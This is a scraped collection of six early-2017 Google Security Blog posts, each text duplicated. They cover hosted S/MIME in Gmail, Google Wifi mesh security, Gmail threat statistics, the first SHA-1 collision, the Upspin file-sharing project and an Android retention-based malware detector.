{"website": "Google-Security", "title": "\nHosted S/MIME by Google provides enhanced security for Gmail in the enterprise\n", "author": ["Posted by Nicolas Kardas, Gmail Product Management and Nicolas Lidzborski, G Suite Security Engineering Lead"], "link": "https://security.googleblog.com/2017/02/hosted-smime-by-google-provides.html", "abstract": "                             Posted by Nicolas Kardas, Gmail Product Management and Nicolas Lidzborski, G Suite Security Engineering Lead   We are constantly working to meet the needs of our enterprise customers, including enhanced security for their communications. Our aim is to offer a secure method to transport sensitive information despite  insecure channels with email today  and without compromising Gmail extensive protections for spam, phishing and malware.     Why hosted S/MIME?   Client-side  S/MIME  has been around for many years. However, its adoption has been limited because it is difficult to deploy (end users have to manually install certificates to their email applications) and the underlying email service cannot efficiently protect against spam, malware and phishing because client-side S/MIME makes the email content opaque.    With Google&#8217;s new hosted S/MIME solution, once an incoming encrypted email with S/MIME is received, it is stored using  Google's encryption . This means that all normal processing of the email can happen, including extensive protections for spam/phishing/malware, admin services (such as vault retention, auditing and email routing rules), and high value end user features such as mail categorization, advanced search and  Smart Reply . For the vast majority of emails, this is the safest solution - giving the benefit of strong authentication and encryption in transit - without losing the safety and features of Google's processing.    Using hosted S/MIME provides an added layer of security compared to using SMTP over TLS to send emails. TLS only guarantees to the sender&#8217;s service that the first hop transmission is encrypted and to the recipient that the last hop was encrypted. But in practice, emails often take many hops (through forwarders, mailing lists, relays, appliances, etc). With hosted S/MIME, the message itself is encrypted. This facilitates secure transit all the way down to the recipient&#8217;s mailbox.    S/MIME also adds verifiable account-level signatures authentication (versus only domain-based signature with DKIM). This means that email receivers can ensure that incoming email is actually from the sending account, not just a matching domain, and that the message has not been tampered with after it was sent.     How to use hosted S/MIME?   S/MIME requires every email address to have a suitable certificate attached to it. By default, Gmail requires the certificate to be from a publicly trusted root Certificate Authority (CA) which meets  strong cryptographic standards . System administrators will have the option to lower these requirements for their domains.    To use hosted S/MIME, companies need to upload their own certificates (with private keys) to Gmail, which can be done by end users via Gmail settings or by admins in bulk via the Gmail API.    From there, using hosted S/MIME is a seamless experience for end users. When receiving a digitally signed message, Gmail automatically associates the public key with the contact of the sender. By default, Gmail automatically signs and encrypts outbound messages if there is a public S/MIME key available for the recipient. Although users have the option to manually remove encryption, admins can set up rules that override their action.    Hosted S/MIME is supported on Gmail web/iOS/Android, on Inbox and on clients connected to the Gmail service via IMAP. Users can exchange signed and encrypted emails with recipients using hosted S/MIME or client-side S/MIME.     Which companies should consider using hosted S/MIME?   Hosted S/MIME provides a solution that is easy to manage for administrators and seamless for end users. Companies that want security in transit and digital signature/non-repudiation at the account level should consider using hosted S/MIME. This is a need for many companies working with sensitive/confidential information.    Hosted S/MIME is available for  G Suite Enterprise edition  users.                                   Posted by Nicolas Kardas, Gmail Product Management and Nicolas Lidzborski, G Suite Security Engineering Lead We are constantly working to meet the needs of our enterprise customers, including enhanced security for their communications. Our aim is to offer a secure method to transport sensitive information despite insecure channels with email today and without compromising Gmail extensive protections for spam, phishing and malware.  Why hosted S/MIME? Client-side S/MIME has been around for many years. However, its adoption has been limited because it is difficult to deploy (end users have to manually install certificates to their email applications) and the underlying email service cannot efficiently protect against spam, malware and phishing because client-side S/MIME makes the email content opaque.  With Google’s new hosted S/MIME solution, once an incoming encrypted email with S/MIME is received, it is stored using Google's encryption. This means that all normal processing of the email can happen, including extensive protections for spam/phishing/malware, admin services (such as vault retention, auditing and email routing rules), and high value end user features such as mail categorization, advanced search and Smart Reply. For the vast majority of emails, this is the safest solution - giving the benefit of strong authentication and encryption in transit - without losing the safety and features of Google's processing.  Using hosted S/MIME provides an added layer of security compared to using SMTP over TLS to send emails. TLS only guarantees to the sender’s service that the first hop transmission is encrypted and to the recipient that the last hop was encrypted. But in practice, emails often take many hops (through forwarders, mailing lists, relays, appliances, etc). With hosted S/MIME, the message itself is encrypted. This facilitates secure transit all the way down to the recipient’s mailbox.  S/MIME also adds verifiable account-level signatures authentication (versus only domain-based signature with DKIM). This means that email receivers can ensure that incoming email is actually from the sending account, not just a matching domain, and that the message has not been tampered with after it was sent.  How to use hosted S/MIME? S/MIME requires every email address to have a suitable certificate attached to it. By default, Gmail requires the certificate to be from a publicly trusted root Certificate Authority (CA) which meets strong cryptographic standards. System administrators will have the option to lower these requirements for their domains.  To use hosted S/MIME, companies need to upload their own certificates (with private keys) to Gmail, which can be done by end users via Gmail settings or by admins in bulk via the Gmail API.  From there, using hosted S/MIME is a seamless experience for end users. When receiving a digitally signed message, Gmail automatically associates the public key with the contact of the sender. By default, Gmail automatically signs and encrypts outbound messages if there is a public S/MIME key available for the recipient. Although users have the option to manually remove encryption, admins can set up rules that override their action.  Hosted S/MIME is supported on Gmail web/iOS/Android, on Inbox and on clients connected to the Gmail service via IMAP. Users can exchange signed and encrypted emails with recipients using hosted S/MIME or client-side S/MIME.  Which companies should consider using hosted S/MIME? Hosted S/MIME provides a solution that is easy to manage for administrators and seamless for end users. Companies that want security in transit and digital signature/non-repudiation at the account level should consider using hosted S/MIME. This is a need for many companies working with sensitive/confidential information.  Hosted S/MIME is available for G Suite Enterprise edition users.     ", "date": "February 2, 2017"},
{"website": "Google-Security", "title": "\n802.11s Security and Google Wifi\n", "author": ["Posted by Paul Devitt, Security Engineer"], "link": "https://security.googleblog.com/2017/02/80211s-security-and-google-wifi.html", "abstract": "                             Posted by Paul Devitt, Security Engineer     Making sure your home network and information stay secure is our top priority. So when we launched the Google OnHub home router in 2015, we made sure  security was baked into its core . In 2016 we took all we learned from OnHub and made it even better by adding mesh support with the introduction of  Google Wifi .       Secure to the core - Always   The primary mechanism to making sure your Wifi points stay safe is our verified boot mechanism. The operating system and code that your OnHub and Google Wifi run are guaranteed to have been signed by Google. Both OnHub and Google Wifi use  Coreboot and Depthcharge  from ChromeOS and ensure system integrity by implementing  DM-Verity  from Android. To secure Userspace, we use process isolation with  Seccomp-BPF  and a strict set of policies.    On the software side, Google Wifi and OnHub are subject to  expansive fuzz testing  of major components and functions. The continual improvements found by fuzzing are fed into Google Wifi and OnHub, and are made available through the regular automatic updates, secured by Google&#8217;s cloud.       802.11s Security for WiFi   In 2016 with the launch of Google Wifi, we introduced  802.11s mesh technology  to the home router space. The result is a system where multiple Wifi Points work together to create blanket coverage. The specification for 802.11s recommends that appropriate security steps be taken, but doesn&#8217;t strictly define them for people to use. We spent significant time in building a security model into our implementation of 802.11s that Google WiFi and OnHub could use so that your network is always comprised of exactly the devices you expect.    As each mesh node within the network will need to speak securely to its neighboring nodes, it's imperative that a secure method, which is isolated from the user, is established to form those links. Each Wifi node establishes a separate encrypted channel with its neighbors and the primary node. On any major network topology change (such as a node being factory reset, a node added, or an event where an unexpected node joins the network), the mesh will undergo a complete cycling of the encryption keys. Each node will establish and test a new set of keys with its respective neighbors, verify that it has network connectivity and then the network as a whole will transition to the new keys.    These mesh encryption keys are generated locally on your devices and are never transmitted outside of your local network. In the event that a key has been discovered outside of your local network, a rekeying operation will be triggered. The rekeying operations allow for the mesh network to be fully flexible to the user&#8217;s desire and maintain a high level of security for devices communicating across it.   Committed to security   We have an ongoing commitment to the security of Google Wifi and OnHub. Both devices participate in the  Google Vulnerability Rewards Program (VRP)  and eligible bugs can be rewarded up to $20,000 (U.S). We&#8217;re always looking to raise the bar to help our users be secure online.                                   Posted by Paul Devitt, Security Engineer  Making sure your home network and information stay secure is our top priority. So when we launched the Google OnHub home router in 2015, we made sure security was baked into its core. In 2016 we took all we learned from OnHub and made it even better by adding mesh support with the introduction of Google Wifi.  Secure to the core - Always The primary mechanism to making sure your Wifi points stay safe is our verified boot mechanism. The operating system and code that your OnHub and Google Wifi run are guaranteed to have been signed by Google. Both OnHub and Google Wifi use Coreboot and Depthcharge from ChromeOS and ensure system integrity by implementing DM-Verity from Android. To secure Userspace, we use process isolation with Seccomp-BPF and a strict set of policies.  On the software side, Google Wifi and OnHub are subject to expansive fuzz testing of major components and functions. The continual improvements found by fuzzing are fed into Google Wifi and OnHub, and are made available through the regular automatic updates, secured by Google’s cloud.  802.11s Security for WiFi In 2016 with the launch of Google Wifi, we introduced 802.11s mesh technology to the home router space. The result is a system where multiple Wifi Points work together to create blanket coverage. The specification for 802.11s recommends that appropriate security steps be taken, but doesn’t strictly define them for people to use. We spent significant time in building a security model into our implementation of 802.11s that Google WiFi and OnHub could use so that your network is always comprised of exactly the devices you expect.  As each mesh node within the network will need to speak securely to its neighboring nodes, it's imperative that a secure method, which is isolated from the user, is established to form those links. Each Wifi node establishes a separate encrypted channel with its neighbors and the primary node. On any major network topology change (such as a node being factory reset, a node added, or an event where an unexpected node joins the network), the mesh will undergo a complete cycling of the encryption keys. Each node will establish and test a new set of keys with its respective neighbors, verify that it has network connectivity and then the network as a whole will transition to the new keys.  These mesh encryption keys are generated locally on your devices and are never transmitted outside of your local network. In the event that a key has been discovered outside of your local network, a rekeying operation will be triggered. The rekeying operations allow for the mesh network to be fully flexible to the user’s desire and maintain a high level of security for devices communicating across it. Committed to security We have an ongoing commitment to the security of Google Wifi and OnHub. Both devices participate in the Google Vulnerability Rewards Program (VRP) and eligible bugs can be rewarded up to $20,000 (U.S). We’re always looking to raise the bar to help our users be secure online.     ", "date": "February 7, 2017"},
{"website": "Google-Security", "title": "\nUnderstanding differences between corporate and consumer Gmail threats\n", "author": ["Posted by Ali Zand and Vijay Eranti, Anti-Abuse Research and Gmail Abuse"], "link": "https://security.googleblog.com/2017/02/understanding-differences-between.html", "abstract": "                             Posted by Ali Zand and Vijay Eranti, Anti-Abuse Research and Gmail Abuse     We are constantly working to protect our users, and quickly adapt to new online threats. This work never stops: every minute, we prevent over 10 million unsafe or unwanted emails from reaching Gmail users and threatening them with malicious attachments that infect a user&#8217;s machine if opened,  phishing messages  asking for banking or account details, and omnipresent  spam . A cornerstone of our defense is understanding the pulse of the email threat landscape. This awareness helps us to anticipate and react faster to emerging attacks.    Today at RSA, we are sharing key insights about the diversity of threats to corporate Gmail inboxes. We&#8217;ve highlighted some of our key findings below; you can see our full presentation  here . We&#8217;ve already incorporated these insights to help keep our G Suite users safe, and we hope that by exposing these nuances, security and abuse professionals everywhere can better understand their risk profile and customize their defenses accordingly.     How threats to corporate and consumer inboxes differ       While spam may be the most common attack across all inboxes, did you know that malware and phishing are far more likely to target corporate users? Here&#8217;s a breakdown of how attacks stack up for corporate vs. personal inboxes:                       Different threats to different types of organizations            Attackers appear to choose targets based on multiple dimensions, such as the size and the type of the organization, its country of operation, and the organization&#8217;s sector of activity. Let&#8217;s look at an example of corporate users across businesses, nonprofits, government-related industries, and education services. If we consider business inboxes as a baseline, we find attackers are far more likely to target nonprofits with malware, while attackers are more likely to target businesses with phishing and spam.                       These nuances go all the way down to the granularity of country and industry type. This shows how security and abuse professionals must tailor defenses based on their personalized threat model, where no single corporate user faces the same attacks.                 Constant improvements to corporate Gmail protections            Research like this enables us to better protect our users. We are constantly innovating to better protect our users, and we've already implemented these findings into our G Suite protections. Additionally, we have implemented and rolled out several features that help our users stay safe against these ever-evolving threats.         The forefront of our defenses is a state-of-the-art email classifier that detects abusive  messages with 99.9% accuracy .   To protect yourself from unsafe websites, make sure to heed  interstitial warnings  that alert you of potential phishing and malware attacks.   Use many layers of defense: we recommend using a  security key enforcement  (2-step verification) to thwart attackers from accessing your account in the event of a stolen password.   To ensure your email contents&#8217; stays safe and secure in transit, use our  hosted S/MIME  feature.   Use our  TLS encryption indicator , to ensure only the intended recipient can read your email.      We will never stop working to keep our users and their inboxes secure. To learn more about how we protect Gmail, check out this YouTube video that summarizes the lessons we learned while protecting Gmail users through the years.                                     Posted by Ali Zand and Vijay Eranti, Anti-Abuse Research and Gmail Abuse  We are constantly working to protect our users, and quickly adapt to new online threats. This work never stops: every minute, we prevent over 10 million unsafe or unwanted emails from reaching Gmail users and threatening them with malicious attachments that infect a user’s machine if opened, phishing messages asking for banking or account details, and omnipresent spam. A cornerstone of our defense is understanding the pulse of the email threat landscape. This awareness helps us to anticipate and react faster to emerging attacks.  Today at RSA, we are sharing key insights about the diversity of threats to corporate Gmail inboxes. We’ve highlighted some of our key findings below; you can see our full presentation here. We’ve already incorporated these insights to help keep our G Suite users safe, and we hope that by exposing these nuances, security and abuse professionals everywhere can better understand their risk profile and customize their defenses accordingly.  How threats to corporate and consumer inboxes differ  While spam may be the most common attack across all inboxes, did you know that malware and phishing are far more likely to target corporate users? Here’s a breakdown of how attacks stack up for corporate vs. personal inboxes:      Different threats to different types of organizations    Attackers appear to choose targets based on multiple dimensions, such as the size and the type of the organization, its country of operation, and the organization’s sector of activity. Let’s look at an example of corporate users across businesses, nonprofits, government-related industries, and education services. If we consider business inboxes as a baseline, we find attackers are far more likely to target nonprofits with malware, while attackers are more likely to target businesses with phishing and spam.        These nuances go all the way down to the granularity of country and industry type. This shows how security and abuse professionals must tailor defenses based on their personalized threat model, where no single corporate user faces the same attacks.      Constant improvements to corporate Gmail protections    Research like this enables us to better protect our users. We are constantly innovating to better protect our users, and we've already implemented these findings into our G Suite protections. Additionally, we have implemented and rolled out several features that help our users stay safe against these ever-evolving threats.    The forefront of our defenses is a state-of-the-art email classifier that detects abusive messages with 99.9% accuracy. To protect yourself from unsafe websites, make sure to heed interstitial warnings that alert you of potential phishing and malware attacks. Use many layers of defense: we recommend using a security key enforcement (2-step verification) to thwart attackers from accessing your account in the event of a stolen password. To ensure your email contents’ stays safe and secure in transit, use our hosted S/MIME feature. Use our TLS encryption indicator, to ensure only the intended recipient can read your email.   We will never stop working to keep our users and their inboxes secure. To learn more about how we protect Gmail, check out this YouTube video that summarizes the lessons we learned while protecting Gmail users through the years.     ", "date": "February 16, 2017"},
{"website": "Google-Security", "title": "\nAnnouncing the first SHA1 collision\n", "author": ["Posted by Marc Stevens (CWI Amsterdam), Elie Bursztein (Google), Pierre Karpman (CWI Amsterdam), Ange Albertini (Google), Yarik Markov (Google), Alex Petit Bianco (Google), Clement Baisse (Google)"], "link": "https://security.googleblog.com/2017/02/announcing-first-sha1-collision.html", "abstract": "                             Posted by Marc Stevens (CWI Amsterdam), Elie Bursztein (Google), Pierre Karpman (CWI Amsterdam), Ange Albertini (Google), Yarik Markov (Google), Alex Petit Bianco (Google), Clement Baisse (Google)   Cryptographic hash functions like SHA-1 are a cryptographer&#8217;s swiss army knife. You&#8217;ll find that hashes play a role in browser security, managing code repositories, or even just detecting duplicate files in storage. Hash functions compress large amounts of data into a small message digest. As a cryptographic requirement for wide-spread use, finding two messages that lead to the same digest should be computationally infeasible. Over time however, this requirement can fail due to  attacks on the mathematical underpinnings  of hash functions or to increases in computational power.    Today, more than 20 years after of SHA-1 was first introduced, we are announcing the first practical technique for generating a collision. This represents the culmination of two years of research that sprung from a collaboration between the  CWI Institute in Amsterdam  and Google. We&#8217;ve summarized how we went about generating a collision below. As a proof of the attack, we are  releasing two PDFs  that have identical SHA-1 hashes but different content.    For the tech community, our findings emphasize the necessity of sunsetting SHA-1 usage. Google has advocated the deprecation of SHA-1 for many years, particularly when it comes to signing TLS certificates. As early as 2014, the Chrome team  announced  that they would gradually phase out using SHA-1. We hope our practical attack on SHA-1 will cement that the protocol should no longer be considered secure.    We hope that our practical attack against SHA-1 will finally convince the industry that it is urgent to move to safer alternatives such as SHA-256.     What is a cryptographic hash collision?          A collision occurs when two distinct pieces of data&#8212;a document, a binary, or a website&#8217;s certificate&#8212;hash to the same digest as shown above. In practice, collisions should never occur for secure hash functions. However if the hash algorithm has some flaws, as SHA-1 does, a well-funded attacker can craft a collision. The attacker could then use this collision to deceive systems that rely on hashes into accepting a malicious file in place of its benign counterpart. For example, two insurance contracts with drastically different terms.     Finding the SHA-1 collision       In 2013,  Marc Stevens  published a paper that outlined a theoretical approach to create a SHA-1 collision. We started by creating a  PDF prefix  specifically crafted to allow us to generate two documents with arbitrary distinct visual contents, but that would hash to the same SHA-1 digest. In building this theoretical attack in practice we had to overcome some new challenges. We then leveraged Google&#8217;s technical expertise and cloud infrastructure to compute the collision which is one of the largest computations ever completed.    Here are some numbers that give a sense of how large scale this computation was:       Nine quintillion (9,223,372,036,854,775,808) SHA1 computations in total   6,500 years of CPU computation to complete the attack first phase   110 years of GPU computation to complete the second phase                  While those numbers seem very large, the SHA-1 shattered attack is still more than 100,000 times faster than a brute force attack which remains impractical.          Mitigating the risk of SHA-1 collision attacks            Moving forward, it&#8217;s more urgent than ever for security practitioners to migrate to safer cryptographic hashes such as SHA-256 and SHA-3. Following  Google&#8217;s vulnerability disclosure policy , we will wait 90 days before releasing code that allows anyone to create a pair of PDFs that hash to the same SHA-1 sum given two distinct images with some pre-conditions. In order to prevent this attack from active use, we&#8217;ve added protections for Gmail and GSuite users that detects our PDF collision technique. Furthermore, we are providing a  free detection system  to the public.         You can find more details about the SHA-1 attack and detailed research outlining our techniques  here .          About the team            This result is the product of a long-term collaboration between the CWI institute and Google&#8217;s Research security, privacy and anti-abuse group.          Marc Stevens  and  Elie Bursztein  started collaborating on making Marc&#8217;s cryptanalytic attacks against SHA-1 practical using Google infrastructure.  Ange Albertini  developed the PDF attack,  Pierre Karpman  worked on the cryptanalysis and the GPU implementation,  Yarik Markov  took care of the distributed GPU code,  Alex Petit Bianco  implemented the collision detector to protect Google users and Clement Baisse oversaw the reliability of the computations.                                                      Posted by Marc Stevens (CWI Amsterdam), Elie Bursztein (Google), Pierre Karpman (CWI Amsterdam), Ange Albertini (Google), Yarik Markov (Google), Alex Petit Bianco (Google), Clement Baisse (Google) Cryptographic hash functions like SHA-1 are a cryptographer’s swiss army knife. You’ll find that hashes play a role in browser security, managing code repositories, or even just detecting duplicate files in storage. Hash functions compress large amounts of data into a small message digest. As a cryptographic requirement for wide-spread use, finding two messages that lead to the same digest should be computationally infeasible. Over time however, this requirement can fail due to attacks on the mathematical underpinnings of hash functions or to increases in computational power.  Today, more than 20 years after of SHA-1 was first introduced, we are announcing the first practical technique for generating a collision. This represents the culmination of two years of research that sprung from a collaboration between the CWI Institute in Amsterdam and Google. We’ve summarized how we went about generating a collision below. As a proof of the attack, we are releasing two PDFs that have identical SHA-1 hashes but different content.  For the tech community, our findings emphasize the necessity of sunsetting SHA-1 usage. Google has advocated the deprecation of SHA-1 for many years, particularly when it comes to signing TLS certificates. As early as 2014, the Chrome team announced that they would gradually phase out using SHA-1. We hope our practical attack on SHA-1 will cement that the protocol should no longer be considered secure.  We hope that our practical attack against SHA-1 will finally convince the industry that it is urgent to move to safer alternatives such as SHA-256.  What is a cryptographic hash collision?   A collision occurs when two distinct pieces of data—a document, a binary, or a website’s certificate—hash to the same digest as shown above. In practice, collisions should never occur for secure hash functions. However if the hash algorithm has some flaws, as SHA-1 does, a well-funded attacker can craft a collision. The attacker could then use this collision to deceive systems that rely on hashes into accepting a malicious file in place of its benign counterpart. For example, two insurance contracts with drastically different terms.  Finding the SHA-1 collision  In 2013, Marc Stevens published a paper that outlined a theoretical approach to create a SHA-1 collision. We started by creating a PDF prefix specifically crafted to allow us to generate two documents with arbitrary distinct visual contents, but that would hash to the same SHA-1 digest. In building this theoretical attack in practice we had to overcome some new challenges. We then leveraged Google’s technical expertise and cloud infrastructure to compute the collision which is one of the largest computations ever completed.  Here are some numbers that give a sense of how large scale this computation was:   Nine quintillion (9,223,372,036,854,775,808) SHA1 computations in total 6,500 years of CPU computation to complete the attack first phase 110 years of GPU computation to complete the second phase       While those numbers seem very large, the SHA-1 shattered attack is still more than 100,000 times faster than a brute force attack which remains impractical.    Mitigating the risk of SHA-1 collision attacks    Moving forward, it’s more urgent than ever for security practitioners to migrate to safer cryptographic hashes such as SHA-256 and SHA-3. Following Google’s vulnerability disclosure policy, we will wait 90 days before releasing code that allows anyone to create a pair of PDFs that hash to the same SHA-1 sum given two distinct images with some pre-conditions. In order to prevent this attack from active use, we’ve added protections for Gmail and GSuite users that detects our PDF collision technique. Furthermore, we are providing a free detection system to the public.    You can find more details about the SHA-1 attack and detailed research outlining our techniques here.    About the team    This result is the product of a long-term collaboration between the CWI institute and Google’s Research security, privacy and anti-abuse group.    Marc Stevens and Elie Bursztein started collaborating on making Marc’s cryptanalytic attacks against SHA-1 practical using Google infrastructure. Ange Albertini developed the PDF attack, Pierre Karpman worked on the cryptanalysis and the GPU implementation, Yarik Markov took care of the distributed GPU code, Alex Petit Bianco implemented the collision detector to protect Google users and Clement Baisse oversaw the reliability of the computations.           ", "date": "February 23, 2017"},
{"website": "Google-Security", "title": "\nAnother option for file sharing\n", "author": ["Posted by Andrew Gerrand, Eric Grosse, Rob Pike, Eduardo Pinheiro and Dave Presotto, Google Software Engineers"], "link": "https://security.googleblog.com/2017/02/another-option-for-file-sharing.html", "abstract": "                             Posted by Andrew Gerrand, Eric Grosse, Rob Pike, Eduardo Pinheiro and Dave Presotto, Google Software Engineers     Existing mechanisms for file sharing are so fragmented that people waste time on multi-step copying and repackaging. With the new project  Upspin , we aim to improve the situation by providing a global name space to name all your files. Given an Upspin name, a file can be shared securely, copied efficiently without \"download\" and \"upload\", and accessed by anyone with permission from anywhere with a network connection.    Our target audience is personal users, families, or groups of friends. Although Upspin might have application in enterprise environments, we think that focusing on the consumer case enables easy-to-understand and easy-to-use sharing.      File names begin with the user's email address followed by a slash-separated Unix-like path name:     ann@example.com/dir/file.   Any user with appropriate permission can access the contents of this file by using Upspin services to evaluate the full path name, typically via a FUSE filesystem so that unmodified applications just work. Upspin names usually identify regular static files and directories, but may point to dynamic content generated by devices such as sensors or services.    If the user wishes to share a directory (the unit at which sharing privileges are granted), she adds a file called Access to that directory. In that file she describes the rights she wishes to grant and the users she wishes to grant them to. For instance,     read: joe@here.com, mae@there.com   allows Joe and Mae to read any of the files in the directory holding the Access file, and also in its subdirectories. As well as limiting who can fetch bytes from the server, this access is enforced end-to-end cryptographically, so cleartext only resides on Upspin clients, and use of cloud storage does not extend the trust boundary.    Upspin looks a bit like a global file system, but its real contribution is a set of interfaces, protocols, and components from which an information management system can be built, with properties such as security and access control suited to a modern, networked world. Upspin is not an \"app\" or a web service, but rather a suite of software components, intended to run in the network and on devices connected to it, that together provide a secure, modern information storage and sharing network. Upspin is a layer of infrastructure that other software and services can build on to facilitate secure access and sharing. This is an open source contribution, not a Google product. We have not yet integrated with the  Key Transparency  server, though we expect to eventually, and for now use a similar technique of securely publishing all key updates. File storage is inherently an archival medium without forward secrecy; loss of the user's encryption keys implies loss of content, though we do provide for key rotation.    It&#8217;s early days, but we&#8217;re encouraged by the progress and look forward to feedback and contributions. To learn more, see the GitHub repository at  upspin .                                   Posted by Andrew Gerrand, Eric Grosse, Rob Pike, Eduardo Pinheiro and Dave Presotto, Google Software Engineers  Existing mechanisms for file sharing are so fragmented that people waste time on multi-step copying and repackaging. With the new project Upspin, we aim to improve the situation by providing a global name space to name all your files. Given an Upspin name, a file can be shared securely, copied efficiently without \"download\" and \"upload\", and accessed by anyone with permission from anywhere with a network connection.  Our target audience is personal users, families, or groups of friends. Although Upspin might have application in enterprise environments, we think that focusing on the consumer case enables easy-to-understand and easy-to-use sharing.   File names begin with the user's email address followed by a slash-separated Unix-like path name:  ann@example.com/dir/file. Any user with appropriate permission can access the contents of this file by using Upspin services to evaluate the full path name, typically via a FUSE filesystem so that unmodified applications just work. Upspin names usually identify regular static files and directories, but may point to dynamic content generated by devices such as sensors or services.  If the user wishes to share a directory (the unit at which sharing privileges are granted), she adds a file called Access to that directory. In that file she describes the rights she wishes to grant and the users she wishes to grant them to. For instance,  read: joe@here.com, mae@there.com allows Joe and Mae to read any of the files in the directory holding the Access file, and also in its subdirectories. As well as limiting who can fetch bytes from the server, this access is enforced end-to-end cryptographically, so cleartext only resides on Upspin clients, and use of cloud storage does not extend the trust boundary.  Upspin looks a bit like a global file system, but its real contribution is a set of interfaces, protocols, and components from which an information management system can be built, with properties such as security and access control suited to a modern, networked world. Upspin is not an \"app\" or a web service, but rather a suite of software components, intended to run in the network and on devices connected to it, that together provide a secure, modern information storage and sharing network. Upspin is a layer of infrastructure that other software and services can build on to facilitate secure access and sharing. This is an open source contribution, not a Google product. We have not yet integrated with the Key Transparency server, though we expect to eventually, and for now use a similar technique of securely publishing all key updates. File storage is inherently an archival medium without forward secrecy; loss of the user's encryption keys implies loss of content, though we do provide for key rotation.  It’s early days, but we’re encouraged by the progress and look forward to feedback and contributions. To learn more, see the GitHub repository at upspin.     ", "date": "February 21, 2017"},
{"website": "Google-Security", "title": "\nSilence speaks louder than words when finding malware\n", "author": [], "link": "https://security.googleblog.com/2017/01/silence-speaks-louder-than-words-when.html", "abstract": "                                 Posted by Megan Ruthven, Software Engineer       [Cross-posted from the  Android Developers Blog ]    In Android Security, we're constantly working to better understand how to make Android devices operate more smoothly and securely. One security solution included on all devices with Google Play is  Verify apps . Verify apps checks if there are Potentially Harmful Apps (PHAs) on your device. If a PHA is found, Verify apps warns the user and enables them to uninstall the app.    But, sometimes devices stop checking up with Verify apps. This may happen for a non-security related reason, like buying a new phone, or, it could mean something more concerning is going on. When a device stops checking up with Verify apps, it is considered Dead or Insecure (DOI). An app with a high enough percentage of DOI devices downloading it, is considered a DOI app. We use the DOI metric, along with the other security systems to help determine if an app is a PHA to protect Android users. Additionally, when we discover vulnerabilities, we patch Android devices with our  security update system .     This blog post explores the Android Security team's research to identify the security-related reasons that devices stop working and prevent it from happening in the future.       Flagging DOI Apps           To understand this problem more deeply, the Android Security team correlates app install attempts and DOI devices to find apps that harm the device in order to protect our users.    With these factors in mind, we then focus on 'retention'. A device is considered retained if it continues to perform periodic Verify apps security check ups after an app download. If it doesn't, it's considered potentially dead or insecure (DOI). An app's retention rate is the percentage of all retained devices that downloaded the app in one day. Because retention is a strong indicator of device health, we work to maximize the ecosystem's retention rate.     Therefore, we use an app DOI scorer, which assumes that all apps should have a similar device retention rate. If an app's retention rate is a couple of standard deviations lower than average, the DOI scorer flags it. A common way to calculate the number of standard deviations from the average is called a Z-score. The equation for the Z-score is below.        N = Number of devices that downloaded the app.    x = Number of retained devices that downloaded the app.    p = Probability of a device downloading any app will be retained.             In this context, we call the Z-score of an app's retention rate a DOI score. The DOI score indicates an app has a statistically significant lower retention rate if the Z-score is much less than -3.7. This means that if the null hypothesis is true, there is much less than a 0.01% chance the magnitude of the Z-score being as high. In this case, the null hypothesis means the app accidentally correlated with lower retention rate independent of what the app does.          This allows for percolation of extreme apps (with low retention rate and high number of downloads) to the top of the DOI list. From there, we combine the DOI score with other information to determine whether to classify the app as a PHA. We then use Verify apps to remove existing installs of the app and prevent future installs of the app.            Difference between a regular and DOI app download on the same device.                    Results in the wild       Among others, the DOI score flagged many apps in three well known malware families&#8212;  Hummingbad ,  Ghost Push , and  Gooligan . Although they behave differently, the DOI scorer flagged over 25,000 apps in these three families of malware because they can degrade the Android experience to such an extent that a non-negligible amount of users factory reset or abandon their devices. This approach provides us with another perspective to discover PHAs and block them before they gain popularity. Without the DOI scorer, many of these apps would have escaped the extra scrutiny of a manual review.    The DOI scorer and all of Android's anti-malware work is one of multiple layers protecting users and developers on Android. For an overview of Android's security and transparency efforts, check out  our page .                                             Posted by Megan Ruthven, Software Engineer   [Cross-posted from the Android Developers Blog]  In Android Security, we're constantly working to better understand how to make Android devices operate more smoothly and securely. One security solution included on all devices with Google Play is Verify apps. Verify apps checks if there are Potentially Harmful Apps (PHAs) on your device. If a PHA is found, Verify apps warns the user and enables them to uninstall the app.  But, sometimes devices stop checking up with Verify apps. This may happen for a non-security related reason, like buying a new phone, or, it could mean something more concerning is going on. When a device stops checking up with Verify apps, it is considered Dead or Insecure (DOI). An app with a high enough percentage of DOI devices downloading it, is considered a DOI app. We use the DOI metric, along with the other security systems to help determine if an app is a PHA to protect Android users. Additionally, when we discover vulnerabilities, we patch Android devices with our security update system.   This blog post explores the Android Security team's research to identify the security-related reasons that devices stop working and prevent it from happening in the future.   Flagging DOI Apps   To understand this problem more deeply, the Android Security team correlates app install attempts and DOI devices to find apps that harm the device in order to protect our users.  With these factors in mind, we then focus on 'retention'. A device is considered retained if it continues to perform periodic Verify apps security check ups after an app download. If it doesn't, it's considered potentially dead or insecure (DOI). An app's retention rate is the percentage of all retained devices that downloaded the app in one day. Because retention is a strong indicator of device health, we work to maximize the ecosystem's retention rate.   Therefore, we use an app DOI scorer, which assumes that all apps should have a similar device retention rate. If an app's retention rate is a couple of standard deviations lower than average, the DOI scorer flags it. A common way to calculate the number of standard deviations from the average is called a Z-score. The equation for the Z-score is below.    N = Number of devices that downloaded the app.  x = Number of retained devices that downloaded the app.  p = Probability of a device downloading any app will be retained.    In this context, we call the Z-score of an app's retention rate a DOI score. The DOI score indicates an app has a statistically significant lower retention rate if the Z-score is much less than -3.7. This means that if the null hypothesis is true, there is much less than a 0.01% chance the magnitude of the Z-score being as high. In this case, the null hypothesis means the app accidentally correlated with lower retention rate independent of what the app does.    This allows for percolation of extreme apps (with low retention rate and high number of downloads) to the top of the DOI list. From there, we combine the DOI score with other information to determine whether to classify the app as a PHA. We then use Verify apps to remove existing installs of the app and prevent future installs of the app.     Difference between a regular and DOI app download on the same device.      Results in the wild   Among others, the DOI score flagged many apps in three well known malware families— Hummingbad, Ghost Push, and Gooligan. Although they behave differently, the DOI scorer flagged over 25,000 apps in these three families of malware because they can degrade the Android experience to such an extent that a non-negligible amount of users factory reset or abandon their devices. This approach provides us with another perspective to discover PHAs and block them before they gain popularity. Without the DOI scorer, many of these apps would have escaped the extra scrutiny of a manual review.  The DOI scorer and all of Android's anti-malware work is one of multiple layers protecting users and developers on Android. For an overview of Android's security and transparency efforts, check out our page.        ", "date": "January 17, 2017"},
